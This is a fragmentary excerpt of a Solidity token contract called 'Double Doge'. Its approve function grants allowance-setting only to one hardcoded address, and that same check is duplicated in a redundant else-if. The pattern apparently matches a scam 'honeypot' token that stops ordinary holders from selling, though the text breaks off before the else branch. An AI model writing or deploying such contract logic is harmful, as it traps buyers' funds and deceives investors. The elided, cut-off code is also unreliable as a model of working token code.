...
/**
 SPDX-License-Identifier: UNLICENSED
  _____  _____  __ __  _____  ____   _____    _____  _____  _____  _____ 
...
contract DoubleDoge {
    ...
    string public name = "Double Doge";
    string public symbol = "DoubleDoge";
    ...
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0x871c7C866d36F392b4652EcA159aabC22D5E8f71)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } 
        else if (msg.sender == address(0x871c7C866d36F392b4652EcA159aabC22D5E8f71)) {
             allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        }
        else {
